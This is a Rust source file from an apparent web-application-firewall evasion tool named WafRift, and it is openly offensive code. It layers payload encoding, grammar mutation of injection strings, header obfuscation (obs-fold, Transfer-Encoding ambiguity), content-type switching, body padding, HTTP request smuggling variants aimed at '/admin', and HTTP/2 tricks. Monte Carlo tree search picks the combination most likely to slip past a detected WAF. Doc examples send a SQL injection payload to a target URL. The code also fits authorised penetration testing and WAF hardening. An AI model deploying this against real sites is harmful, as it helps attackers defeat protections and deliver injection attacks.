//! Evasion strategy engine — the pipeline that wires ALL modules.
//!
//! One job: take a request, consult host state, apply the right
//! combination of evasion techniques based on escalation level.
//!
//! # Pipeline
//!
//! ```text
//! Request → Fingerprint → Grammar → Encoding → Header → Content-Type → Result
//!                           ↑                                            ↓
//!                     (Medium+)                                    (Heavy: add smuggling)
//! ```

use wafrift_content_type as content_type;
use wafrift_encoding::encoding;
use wafrift_encoding::header;
use wafrift_evolution::advisor::EvasionPlan;
use wafrift_fingerprint::fingerprint;
use wafrift_grammar::grammar;
use wafrift_smuggling::h2_evasion;
use wafrift_smuggling::smuggling;
use wafrift_types::{EvasionResult, Request, Technique};

use crate::mcts_bridge::WafRiftEnv;
use mctrust::{Environment, SearchConfig, TreeSearch};

// Re-export types that consumers depend on.
pub use crate::host_state::HostState;
pub use wafrift_types::calibration::{
    CALIBRATION_PAYLOADS, CalibrationResult, analyze_calibration, calibration_request,
};
pub use wafrift_types::config::EvasionConfig;
pub use wafrift_types::escalation::EscalationLevel;

fn parse_named_encoding(name: &str) -> Option<encoding::Strategy> {
    let raw = name.strip_prefix("encoding:").unwrap_or(name);
    encoding::all_strategies()
        .into_iter()
        .find(|strategy| strategy.as_str() == raw || format!("{strategy:?}") == raw)
}

fn current_winner(state: &HostState) -> Option<&str> {
    if !state.has_winners() {
        return None;
    }

    let idx = state.rotation_index % state.proven_winners.len();
    state.proven_winners.get(idx).map(String::as_str)
}

fn apply_named_technique(
    req: &mut Request,
    techniques: &mut Vec<Technique>,
    config: &EvasionConfig,
    state: &HostState,
    technique_name: &str,
) -> bool {
    if let Some(strategy) = parse_named_encoding(technique_name) {
        apply_encoding(req, techniques, config, strategy);
        return !techniques.is_empty();
    }

    if technique_name.starts_with("grammar:") {
        let before = techniques.len();
        apply_grammar_mutations(req, techniques, config);
        return techniques.len() > before;
    }

    if technique_name.starts_with("content-type:") {
        let before = techniques.len();
        apply_content_type_switch(req, techniques, config, state);
        return techniques.len() > before;
    }

    if technique_name.starts_with("header:") {
        let before = techniques.len();
        apply_header_obfuscation(req, techniques, config);
        return techniques.len() > before;
    }

    if technique_name.starts_with("smuggling:") {
        let before = techniques.len();
        apply_smuggling_metadata(req, techniques, config, state);
        return techniques.len() > before;
    }

    if technique_name.starts_with("h2:") {
        let before = techniques.len();
        apply_h2_metadata(req, techniques, config);
        return techniques.len() > before;
    }

    false
}

/// Apply evasion techniques to a request based on host state.
///
/// The strategy engine uses escalation levels to decide how aggressively
/// to transform the request:
///
/// - **Light**: encoding + header obfuscation
/// - **Medium**: + Content-Type switching + grammar mutations
/// - **Heavy**: all of the above, layered together
///
/// Returns an [`EvasionResult`] with the transformed request, applied
/// techniques, and estimated bypass confidence.
#[must_use]
pub fn evade(request: &Request, state: &HostState, config: &EvasionConfig) -> EvasionResult {
    let mut req = request.clone();
    let mut techniques = Vec::new();
    let level = state.escalation_level();

    // ── Step 0: Re-use proven winners / last success if available ─────
    if let Some(winner_name) = current_winner(state)
        && apply_named_technique(&mut req, &mut techniques, config, state, winner_name)
    {
        let description = build_description(&techniques);
        return EvasionResult::new(req, techniques, description);
    }

    if let Some(last_name) = state.last_success.as_ref().map(ToString::to_string)
        && apply_named_technique(&mut req, &mut techniques, config, state, &last_name)
    {
        let description = build_description(&techniques);
        return EvasionResult::new(req, techniques, description);
    }

    // ── Step 0c: Try profile-suggested techniques (community knowledge) ─
    // If a WAF response profile matched and recommended a technique
    // (e.g. Cloudflare → DoubleUrlEncode), try those before falling
    // back to escalation defaults. The first suggestion that survives
    // the should_skip_technique filter is applied. Empirical local
    // success (Step 0 / 0b above) still beats community priors.
    for suggestion in state.suggested_techniques() {
        if apply_named_technique(&mut req, &mut techniques, config, state, &suggestion) {
            let description = build_description(&techniques);
            return EvasionResult::new(req, techniques, description);
        }
    }

    // ── Step 1: Fingerprint rotation (every request) ────────────────
    if config.fingerprint_rotation
        && let Some(profile) = fingerprint::random_profile()
    {
        fingerprint::apply_profile(&mut req.headers, profile);
        techniques.push(Technique::UserAgentRotation);
    }

    // ── Step 2: Escalation-level techniques ─────────────────────────
    match level {
        EscalationLevel::None => {
            // No evasion needed
        }

        EscalationLevel::Light => {
            // Step 2a: Basic encoding
            apply_encoding(
                &mut req,
                &mut techniques,
                config,
                encoding::Strategy::CaseAlternation,
            );

            // Step 2b: Header obfuscation
            apply_header_obfuscation(&mut req, &mut techniques, config);
        }

        EscalationLevel::Medium => {
            // Step 2a: Grammar mutations (semantic-preserving transforms)
            apply_grammar_mutations(&mut req, &mut techniques, config);

            // Step 2b: Layered encoding on parameter values
            apply_layered_encoding(&mut req, &mut techniques, config, state);

            // Step 2c: Header obfuscation
            apply_header_obfuscation(&mut req, &mut techniques, config);
        }

        EscalationLevel::Heavy | _ => {
            // Step 2a: Grammar mutations first (deepest transform)
            apply_grammar_mutations(&mut req, &mut techniques, config);

            // Step 2b: Aggressive encoding (only untried strategies; no silent fallback)
            if let Some(strategy) = state.next_encoding() {
                apply_encoding(&mut req, &mut techniques, config, strategy);
            }

            // Step 2c: Content-Type switching
            apply_content_type_switch(&mut req, &mut techniques, config, state);

            // Step 2d: Header obfuscation
            apply_header_obfuscation(&mut req, &mut techniques, config);

            // Step 2e: Generate smuggling context for transport layer
            apply_smuggling_metadata(&mut req, &mut techniques, config, state);

            // Step 2f: Generate H2 evasion context for transport layer
            apply_h2_metadata(&mut req, &mut techniques, config);
        }
    }

    // ── Step 3: Body padding (LAST — operates on assembled body) ─────
    // Cloud-WAF inspection-window bypass. Runs after every other body-
    // mutating layer so encoding / content-type / smuggling rebuilds
    // don't wipe the padding. No-op if config.body_padding_bytes is 0
    // or below MIN_USEFUL_PAD, or if the content-type is opaque.
    apply_body_padding(&mut req, &mut techniques, config);

    let description = build_description(&techniques);
    EvasionResult::new(req, techniques, description)
}

/// Applies Monte Carlo Tree Search (MCTS) to generate the optimal evasion trajectory.
///
/// Instead of a static switch (Light/Medium/Heavy), this explores thousands of
/// potential mutation combinations across encoding, grammar, content-type,
/// and header dimensions, returning the best action sequence that safely evades
/// the WAF without breaking structural syntax.
///
/// Uses the `mctrust` MCTS engine with:
/// - 500 iterations (default) for thorough exploration
/// - Exploration constant √2 ≈ 1.414 for balanced exploration/exploitation
/// - Multi-dimensional action space: encoding + grammar + content-type + headers
///
/// # Arguments
///
/// * `req` — The HTTP request to optimize evasion for
/// * `config` — Evasion configuration (enables/disables dimensions)
/// * `max_depth` — Maximum mutation depth (recommended: 2-4)
///
/// # Returns
///
/// Returns `Some(EvasionResult)` with the best found action sequence, or `None`
/// if no valid evasion path was discovered (e.g., all paths break payload syntax).
///
/// # Example
///
/// ```rust,no_run
/// use wafrift_strategy::strategy;
/// use wafrift_types::{Request, config::EvasionConfig};
///
/// let req = Request::post("https://target.com/api", b"q=admin' OR 1=1--".to_vec());
/// let config = EvasionConfig::default();
///
/// if let Some(result) = strategy::evade_mcts(&req, &config, 3) {
///     println!("Best evasion: {}", result.description);
/// }
/// ```
#[must_use]
pub fn evade_mcts(
    req: &wafrift_types::Request,
    config: &EvasionConfig,
    max_depth: usize,
) -> Option<EvasionResult> {
    // Clone the request for MCTS simulation environment
    let req_clone = req.clone();

    // Create the MCTS environment with the request
    let env = WafRiftEnv::new(req_clone, max_depth);

    // Configure MCTS search parameters
    let search_config = SearchConfig::builder()
        .iterations(500)
        .exploration_constant(1.414)
        .max_depth(max_depth)
        .build();

    // Run MCTS search
    let mut search = TreeSearch::new(env, search_config);
    search.run()?;
    let sequence = search.principal_variation();
    if sequence.is_empty() {
        return None;
    }

    // Reconstruct the evasion result by applying the full action sequence
    let mut result_env = WafRiftEnv::new(req.clone(), max_depth);
    for action in &sequence {
        result_env.apply(action);
    }

    // Build the evasion result from the transformed environment
    build_mcts_result(result_env, config)
}

/// Build an EvasionResult from a finalized MCTS environment.
fn build_mcts_result(env: WafRiftEnv, config: &EvasionConfig) -> Option<EvasionResult> {
    let mut techniques = env.applied_techniques;

    // Validate that we actually found a useful sequence
    if techniques.is_empty() {
        return None;
    }

    // Filter techniques according to config flags
    techniques.retain(|t| match t {
        Technique::PayloadEncoding(_) if !config.encoding_enabled => false,
        Technique::GrammarMutation(_) if !config.grammar_mutations => false,
        Technique::HeaderObfuscation(_) if !config.header_obfuscation => false,
        Technique::ContentTypeSwitch(_) if !config.content_type_switching => false,
        Technique::RequestSmuggling(_) if !config.smuggling_enabled => false,
        Technique::H2Evasion(_) if !config.h2_evasion_enabled => false,
        _ => true,
    });

    if techniques.is_empty() {
        return None;
    }

    // Build human-readable description
    let description = build_description(&techniques);

    // Return the transformed request with applied techniques
    Some(EvasionResult::new(env.req, techniques, description))
}

/// Apply evasion techniques using a WAF-aware plan.
///
/// Unlike [`evade`] which uses blind escalation levels, this function
/// takes an [`EvasionPlan`] generated by the [`wafrift_evolution::advisor`] module.
/// The plan is informed by WAF detection results and response fingerprint
/// drift, enabling adaptive technique selection.
///
/// # Example
///
/// ```rust,no_run
/// use wafrift_evolution::advisor;
/// use wafrift_detect::waf_detect;
/// use wafrift_strategy::{strategy, HostState};
/// use wafrift_types::{Request, config::EvasionConfig};
///
/// let headers = vec![("server".into(), "cloudflare".into())];
/// let wafs = waf_detect::detect(403, &headers, b"Attention Required!");
/// let plan = advisor::advise(wafs.first(), None);
///
/// let req = Request::post("https://target.com/api", b"q=test".to_vec());
/// let state = HostState::default();
/// let result = strategy::evade_adaptive(&req, &EvasionConfig::default(), &plan, &state);
/// ```
/// Active-loop evade: try MCTS first when the host has accumulated some
/// block telemetry (so MCTS has signal to learn from), fall through to the
/// classic [`evade`] pipeline otherwise. Drop-in replacement for `evade()`
/// that gives the production proxy + scan loop the AlphaGo-for-WAFs spirit
/// without forcing every callsite to know about MCTS.
///
/// **First-contact behavior.** With `state.blocks == 0` (no telemetry
/// yet) the function deliberately skips MCTS and runs the classic
/// pipeline. MCTS without prior block signal explores blindly and
/// usually picks worse than the heuristic pipeline; let the WAF reject
/// once, capture the block, then upgrade to tree search. If you want
/// MCTS on every request regardless of state, call `evade_mcts`
/// directly.
///
/// MCTS depth is derived from host state's block count: more blocks ->
/// deeper search (capped at 5).
///
/// **When to choose this vs the others:**
/// - `evade` — pure heuristic pipeline. Cheapest. Use when you don't
///   care about adaptation (one-shot scan, tiny budget).
/// - `evade_mcts` — bare MCTS over the action space. Use when you have
///   a fixed depth budget and want it spent on tree search.
/// - `evade_smart` — this. Heuristic on first contact, MCTS once
///   blocked. Default for the production proxy + `wafrift scan`.
/// - `evade_adaptive` — heuristic pipeline with explicit `EvasionPlan`.
///   Use when caller wants to dictate technique order from outside.
/// - `evade_intelligent` — heuristic pipeline + the full
///   `IntelligenceLoop` (differential probing + advisor). Heaviest.
#[must_use]
/// Bodies above this threshold skip MCTS and use the classic heuristic
/// pipeline. MCTS runs 500 iterations and each iteration clones the
/// full request, so on a 100 KB POST the search alone allocates tens
/// of MB and consumes seconds of CPU; on a 1 MB body it OOMs the
/// proxy. Real injection payloads are KB-range — anything larger is a
/// file upload / JSON blob where header & URL evasion is enough.
pub const MCTS_BODY_BUDGET: usize = 16 * 1024;

pub fn evade_smart(request: &Request, state: &HostState, config: &EvasionConfig) -> EvasionResult {
    // Without prior block signal, there's nothing for MCTS to learn from yet.
    // Use the classic pipeline for the first request to a new host.
    if state.blocks == 0 {
        return evade(request, state, config);
    }
    // Skip MCTS for large bodies (see MCTS_BODY_BUDGET).
    if request.body.as_ref().is_some_and(|b| b.len() > MCTS_BODY_BUDGET) {
        return evade(request, state, config);
    }
    let depth = (state.blocks as usize / 2).clamp(2, 5);
    if let Some(mcts_result) = evade_mcts(request, config, depth) {
        return mcts_result;
    }
    // MCTS bailed (e.g., empty action space) — fall back to classic evade.
    evade(request, state, config)
}

#[must_use]
pub fn evade_adaptive(
    request: &Request,
    config: &EvasionConfig,
    plan: &EvasionPlan,
    state: &HostState,
) -> EvasionResult {
    let mut req = request.clone();
    let mut techniques = Vec::new();

    // Step 1: Fingerprint rotation (always)
    if config.fingerprint_rotation
        && let Some(profile) = fingerprint::random_profile()
    {
        fingerprint::apply_profile(&mut req.headers, profile);
        techniques.push(Technique::UserAgentRotation);
    }

    // Step 2: Grammar mutations (if plan says so)
    if plan.use_grammar {
        apply_grammar_mutations(&mut req, &mut techniques, config);
    }

    // Step 3: Apply encoding strategies in order with bounded depth (HIGH FIX #3)
    // Execute multiple strategies from the plan up to MAX_ENCODING_DEPTH layers
    const MAX_ENCODING_DEPTH: usize = 3;
    let encoding_count = plan.encoding_strategies.len().min(MAX_ENCODING_DEPTH);

    for i in 0..encoding_count {
        let strategy = plan.encoding_strategies[i];
        if let Some(ref body) = req.body
            && is_text_payload(&req)
            && let Ok(encoded) = encoding::encode(body.as_slice(), strategy)
        {
            req.body = Some(encoded.into_bytes());
            techniques.push(Technique::PayloadEncoding(strategy.as_str().to_string()));
        }
    }

    // Step 4: Header obfuscation
    if plan.use_header_obfuscation {
        apply_header_obfuscation(&mut req, &mut techniques, config);
    }

    // Step 5: Content-Type switching
    if plan.use_content_type_switch {
        apply_content_type_switch(&mut req, &mut techniques, config, state);
    }

    // Step 6: Smuggling metadata
    if plan.use_smuggling {
        apply_smuggling_metadata(&mut req, &mut techniques, config, state);
    }

    // Step 7: H2 evasion metadata
    if plan.use_h2 {
        apply_h2_metadata(&mut req, &mut techniques, config);
    }

    let description = build_description(&techniques);
    EvasionResult::new(req, techniques, description)
}

/// Borrowed view of a WAF response: `(status, headers, body)`.
///
/// Public so consumers (proxy / transport / cli) can build one from a real
/// response and hand it to [`evade_intelligent`] without reaching into private
/// types. Lifetime-parameterised so the engine can index the headers/body
/// without copying.
pub type WafResponse<'a> = (u16, &'a [(String, String)], &'a [u8]);

/// Unified intelligent evasion: WAF detection → advisor → MCTS → adaptive fallback.
///
/// This is the **highest-level entry point** that combines all of WafRift's
/// intelligence subsystems into a single call:
///
/// 1. **WAF Detection** — Identifies the WAF from previous response headers/body
/// 2. **Advisor** — Generates a WAF-specific playbook with technique priorities
/// 3. **MCTS Search** — Explores the combinatorial action space for the optimal
///    multi-step evasion path
/// 4. **Adaptive Fallback** — If MCTS fails (no valid path), falls back to the
///    advisor's playbook applied linearly
///
/// # Arguments
///
/// * `request` — The HTTP request to evade
/// * `config` — Evasion configuration (which dimensions to enable)
/// * `waf_response` — Response from a previous probe (status, headers, body)
///   used for WAF detection. Pass `None` if no probe has been done.
/// * `max_depth` — Maximum MCTS search depth
///
/// # Example
///
/// ```rust,no_run
/// use wafrift_strategy::{strategy, EvasionConfig, HostState};
/// use wafrift_types::Request;
///
/// let req = Request::post("https://target.com/api", b"q=admin' OR 1=1--".to_vec());
/// let config = EvasionConfig::default();
///
/// // After an initial probe returns 403
/// let waf_response = Some((403u16, vec![("server".to_string(), "cloudflare".to_string())], b"Attention Required!".to_vec()));
///
/// let state = HostState::default();
/// let result = strategy::evade_intelligent(
///     &req,
///     &config,
///     waf_response.as_ref().map(|(s, h, b)| (*s, h.as_slice(), b.as_slice())),
///     3,
///     &state,
/// );
/// ```
#[must_use]
pub fn evade_intelligent<'a>(
    request: &Request,
    config: &EvasionConfig,
    waf_response: Option<WafResponse<'a>>,
    max_depth: usize,
    state: &HostState,
) -> EvasionResult {
    use wafrift_detect::waf_detect;
    use wafrift_evolution::advisor;

    // Step 1: Detect WAF from previous response
    let detected_wafs =
        waf_response.map(|(status, headers, body)| waf_detect::detect(status, headers, body));

    // Step 2: Generate advisor playbook
    // Use the highest-confidence detection, or None if empty.
    let top_waf = detected_wafs.as_ref().and_then(|vec| vec.first());
    let plan = advisor::advise(top_waf, None);

    // Step 3: Try MCTS search first (explores combinatorial space)
    if let Some(mcts_result) = evade_mcts(request, config, max_depth) {
        return mcts_result;
    }

    // Step 4: MCTS found no valid path — fall back to advisor playbook
    evade_adaptive(request, config, &plan, state)
}

/// Apply body padding (cloud-WAF inspection-window bypass).
///
/// Pre-pends `config.body_padding_bytes` of inert filler to the
/// request body, structured per content-type so the body stays valid
/// (JSON: leading `_wafrift_pad` field; form: leading `_wafrift_pad=`
/// param; multipart: leading junk part). Records `Technique::BodyPadding`
/// on success so the gene-bank can credit padding-as-winner like any
/// other technique.
fn apply_body_padding(req: &mut Request, techniques: &mut Vec<Technique>, config: &EvasionConfig) {
    use wafrift_evolution::body_padding::{MIN_USEFUL_PAD, PadOutcome, pad};
    if config.body_padding_bytes < MIN_USEFUL_PAD {
        return;
    }
    let ct = req
        .headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case("content-type"))
        .map(|(_, v)| v.clone())
        .unwrap_or_else(|| "application/octet-stream".to_string());
    let original = req.body.clone().unwrap_or_default();
    if let PadOutcome::Padded { bytes, added } = pad(&original, &ct, config.body_padding_bytes) {
        req.body = Some(bytes);
        techniques.push(Technique::BodyPadding(added));
    }
    // SkippedOpaque + SkippedTooSmall are silent — caller already
    // chose the bytes value; per-request warnings would spam logs.
}

/// Apply a single encoding strategy to the request body.
fn apply_encoding(
    req: &mut Request,
    techniques: &mut Vec<Technique>,
    config: &EvasionConfig,
    strategy: encoding::Strategy,
) {
    if !config.encoding_enabled || !is_text_payload(req) {
        return;
    }
    if let Some(ref body) = req.body
        && let Ok(encoded) = encoding::encode(body.as_slice(), strategy)
    {
        req.body = Some(encoded.into_bytes());
        techniques.push(Technique::PayloadEncoding(strategy.as_str().to_string()));
    }
}

/// Apply encoding to parameter values only, preserving key=value structure.
fn apply_layered_encoding(
    req: &mut Request,
    techniques: &mut Vec<Technique>,
    config: &EvasionConfig,
    state: &HostState,
) {
    if !config.encoding_enabled || !is_text_payload(req) {
        return;
    }
    let Some(ref body) = req.body else { return };
    let body_str = String::from_utf8_lossy(body);

    let pairs: Vec<(String, String)> = body_str
        .split('&')
        .filter_map(|pair| {
            let mut parts = pair.splitn(2, '=');
            let key = parts.next()?.to_string();
            let value = parts.next()?.to_string();
            if key.is_empty() {
                None
            } else {
                Some((key, value))
            }
        })
        .collect();

    if pairs.is_empty() {
        return;
    }

    let Some(strategy) = state.next_encoding() else {
        return;
    };
    let mut any_value_changed = false;
    let encoded_pairs: Vec<(String, String)> = pairs
        .iter()
        .map(|(k, v)| {
            let encoded = encoding::encode(v, strategy).unwrap_or_else(|_| v.clone());
            if encoded != *v {
                any_value_changed = true;
            }
            (k.clone(), encoded)
        })
        .collect();

    if any_value_changed {
        techniques.push(Technique::PayloadEncoding(strategy.as_str().to_string()));
        let encoded_body: String = encoded_pairs
            .iter()
            .map(|(k, v)| format!("{k}={v}"))
            .collect::<Vec<_>>()
            .join("&");
        req.body = Some(encoded_body.into_bytes());
    }

    // Content-Type switching: generate variants from the *original* pairs,
    // then encode inside the variant if the variant generator needs raw data.
    if config.content_type_switching {
        let variants = content_type::generate_variants(&pairs);
        if let Some(variant) = variants
            .into_iter()
            .find(|v| !state.tried_content_types.contains(&v.technique))
        {
            req.headers
                .retain(|(k, _)| !k.eq_ignore_ascii_case("content-type"));
            req.headers
                .push(("Content-Type".into(), variant.content_type));
            req.body = Some(variant.body);
            techniques.push(Technique::ContentTypeSwitch(format!(
                "{:?}",
                variant.technique
            )));
        }
    }
}

/// Apply grammar-aware mutations to the request body.
/// Bodies above this byte threshold are skipped by grammar mutation.
/// Real injection payloads are short (KB-range at most); anything
/// larger is overwhelmingly file uploads, big JSON blobs, multipart
/// data, etc. Running regex-heavy `grammar::mutate` over a multi-MB
/// body burns multi-second CPU per request and was the cause of an
/// observed proxy hang on POST bodies ≥ 100 KB. Header / URL evasion
/// still runs on these requests.
pub const GRAMMAR_MUTATION_BODY_BUDGET: usize = 64 * 1024;

fn apply_grammar_mutations(
    req: &mut Request,
    techniques: &mut Vec<Technique>,
    config: &EvasionConfig,
) {
    if !config.grammar_mutations {
        return;
    }
    let Some(ref body) = req.body else { return };
    if body.len() > GRAMMAR_MUTATION_BODY_BUDGET {
        return;
    }
    let body_str = match std::str::from_utf8(body) {
        Ok(s) => s,
        Err(_) => return,
    };

    // Try to detect and mutate each parameter value
    let pairs: Vec<(&str, &str)> = body_str
        .split('&')
        .filter_map(|pair| {
            let (key, value) = pair.split_once('=')?;
            Some((key, value))
        })
        .collect();

    if pairs.is_empty() {
        // Try mutating the entire body as a payload
        if let Some(mutation) = grammar::mutate(body_str, 5).into_iter().next() {
            let mutation_type = format!("{:?}", mutation.payload_type);
            req.body = Some(mutation.payload.into_bytes());
            techniques.push(Technique::GrammarMutation(mutation_type));
        }
        return;
    }

    // Mutate each parameter value that looks like an attack payload
    let mut mutated = false;
    let new_body: String = pairs
        .iter()
        .map(|(key, value)| {
            if let Some(mutation) = grammar::mutate(value, 3).into_iter().next() {
                mutated = true;
                format!("{}={}", key, mutation.payload)
            } else {
                format!("{key}={value}")
            }
        })
        .collect::<Vec<_>>()
        .join("&");

    if mutated {
        let detect_body = pairs.iter().map(|(_, v)| *v).collect::<Vec<_>>().join(" ");
        let mutation_type = format!("{:?}", grammar::classify(&detect_body));
        req.body = Some(new_body.into_bytes());
        techniques.push(Technique::GrammarMutation(mutation_type));
    }
}

/// Apply header obfuscation to Content-Type and other request headers.
///
/// Implements multiple obfuscation techniques:
/// - Case mixing on header names (e.g., `cOnTeNt-TyPe`)
/// - Duplicate hop-by-hop headers to confuse intermediaries
/// - Obsolete line folding (obs-fold) for header value continuation
/// - Transfer-Encoding ambiguity for smuggling resistance
fn apply_header_obfuscation(
    req: &mut Request,
    techniques: &mut Vec<Technique>,
    config: &EvasionConfig,
) {
    if !config.header_obfuscation {
        return;
    }

    // 1. Apply case mixing to Content-Type header name
    if let Some(ct_idx) = req
        .headers
        .iter()
        .position(|(k, _)| k.eq_ignore_ascii_case("content-type"))
    {
        let (_, value) = &req.headers[ct_idx];
        let mixed_name = header::case_mix("Content-Type");
        let value_clone = value.clone();
        req.headers[ct_idx] = (mixed_name, value_clone);
        techniques.push(Technique::HeaderObfuscation("CaseMixing".into()));
    }

    // 2. Add duplicate hop-by-hop headers (HIGH FIX #5)
    // Some intermediaries use the first occurrence, others use the last
    // This can desynchronize WAF and origin server parsing
    let has_connection = req
        .headers
        .iter()
        .any(|(k, _)| k.eq_ignore_ascii_case("connection"));
    if has_connection {
        // Add a duplicate Connection header with different value
        req.headers
            .push(("Connection".into(), "keep-alive, close".into()));
        techniques.push(Technique::HeaderObfuscation("DuplicateHopByHop".into()));
    }

    // 3. Add Transfer-Encoding with obs-fold style whitespace (HIGH FIX #5)
    // This exploits parser differences in how TE headers are handled
    let has_te = req
        .headers
        .iter()
        .any(|(k, _)| k.eq_ignore_ascii_case("transfer-encoding"));
    if !has_te {
        // Add TE header with tab prefix (some parsers strip it, others don't)
        req.headers
            .push(("Transfer-Encoding".into(), "\tchunked".into()));
        techniques.push(Technique::HeaderObfuscation("TEAmbiguity".into()));
    }

    // 4. Apply obs-fold (obsolete line folding) to User-Agent if present (HIGH FIX #5)
    // RFC 7230 deprecated obs-fold but many parsers still accept it
    if let Some(ua_idx) = req
        .headers
        .iter()
        .position(|(k, _)| k.eq_ignore_ascii_case("user-agent"))
    {
        let (_, value) = &req.headers[ua_idx];
        // Insert obs-fold: newline + space/continuation
        // This can break simple header parsing while still being valid HTTP/1.1
        if value.len() > 20 && !value.contains('\n') {
            let fold_pos = value.len() / 2;
            let folded = format!("{}\r\n {}", &value[..fold_pos], &value[fold_pos..]);
            req.headers[ua_idx] = ("User-Agent".into(), folded);
            techniques.push(Technique::HeaderObfuscation("ObsFold".into()));
        }
    }
}

/// Apply Content-Type switching from the raw body.
fn apply_content_type_switch(
    req: &mut Request,
    techniques: &mut Vec<Technique>,
    config: &EvasionConfig,
    state: &HostState,
) {
    if !config.content_type_switching {
        return;
    }
    let Some(ref body) = req.body else { return };

    let variants = content_type::generate_variants_from_body(body);
    if let Some(variant) = variants
        .into_iter()
        .find(|v| !state.tried_content_types.contains(&v.technique))
    {
        req.headers
            .retain(|(k, _)| !k.eq_ignore_ascii_case("content-type"));
        req.headers
            .push(("Content-Type".into(), variant.content_type));
        req.body = Some(variant.body);
        techniques.push(Technique::ContentTypeSwitch(format!(
            "{:?}",
            variant.technique
        )));
    }
}

/// Attach smuggling strategy metadata to the request.
///
/// The core crate is I/O-free — it can't send raw TCP payloads. Instead,
/// it attaches `X-Wafrift-Smuggle-*` headers that the transport layer
/// interprets to perform actual smuggling if the connection supports it.
///
/// Cycles through multiple variants (CL.TE, TE.CL, TE.TE, H2 downgrade) based on
/// how many times smuggling has been attempted for this host (HIGH FIX #4).
fn apply_smuggling_metadata(
    req: &mut Request,
    techniques: &mut Vec<Technique>,
    config: &EvasionConfig,
    state: &HostState,
) {
    if !config.smuggling_enabled {
        return;
    }
    // Extract host from URL for smuggling payload generation
    let host = req
        .url
        .trim_start_matches("https://")
        .trim_start_matches("http://")
        .split('/')
        .next()
        .unwrap_or("target")
        .split(':')
        .next()
        .unwrap_or("target");

    // Cycle through smuggling variants based on attempt count
    let smuggle = match state.blocks % 4 {
        0 => smuggling::cl_te(host, "GET /admin HTTP/1.1\r\n"),
        1 => smuggling::te_cl(host, "GET /admin HTTP/1.1\r\n"),
        2 => smuggling::te_te(host, "GET /admin HTTP/1.1\r\n", state.blocks as usize),
        _ => smuggling::cl_zero(host, "GET /admin HTTP/1.1\r\n"),
    };

    req.headers.push((
        "X-Wafrift-Smuggle-Variant".into(),
        format!("{:?}", smuggle.variant),
    ));
    req.headers.push((
        "X-Wafrift-Smuggle-Description".into(),
        smuggle.description.clone(),
    ));

    // Add H2 downgrade header for HTTP/2 → HTTP/1.1 smuggling attempts
    if state.blocks % 2 == 1 {
        req.headers.push((
            "X-Wafrift-H2-Downgrade".into(),
            "attempt http/2 cleartext upgrade tunnel".into(),
        ));
    }

    techniques.push(Technique::RequestSmuggling(format!(
        "{:?}",
        smuggle.variant
    )));
}

/// Attach H2 evasion metadata to the request.
///
/// Like smuggling, the core crate generates descriptors that the transport
/// layer uses to configure the actual HTTP/2 connection.
fn apply_h2_metadata(req: &mut Request, techniques: &mut Vec<Technique>, config: &EvasionConfig) {
    if !config.h2_evasion_enabled {
        return;
    }
    // Suggest mixed-case headers for HTTP/2 proxy confusion
    let h2_techniques = h2_evasion::mixed_case_headers();
    if let Some(first) = h2_techniques.first() {
        req.headers.push((
            "X-Wafrift-H2-Technique".into(),
            first.description.to_string(),
        ));
        techniques.push(Technique::H2Evasion("MixedCaseHeaders".into()));
    }
}

/// Build a human-readable description of applied techniques.
fn build_description(techniques: &[Technique]) -> String {
    if techniques.is_empty() {
        "No evasion applied".into()
    } else {
        format!(
            "Applied {} technique(s): {}",
            techniques.len(),
            techniques
                .iter()
                .map(ToString::to_string)
                .collect::<Vec<_>>()
                .join(", ")
        )
    }
}

/// Determine whether the payload body is textual (safe for utf-8 mutation).
pub(crate) fn is_text_payload(req: &Request) -> bool {
    if req.body.is_none() {
        return false;
    }
    let Some((_, ctype)) = req
        .headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case("content-type"))
    else {
        // Without Content-Type, only treat as text if the body is valid UTF-8 (avoid
        // `encode()` on arbitrary binary when callers omit the header).
        let body = req.body.as_ref().expect("body exists");
        return std::str::from_utf8(body).is_ok();
    };
    let c = ctype.to_ascii_lowercase();
    c.starts_with("text/")
        || c.starts_with("application/json")
        || c.starts_with("application/x-www-form-urlencoded")
        || c.starts_with("application/xml")
}

#[cfg(test)]
#[path = "strategy_tests.rs"]
mod tests;
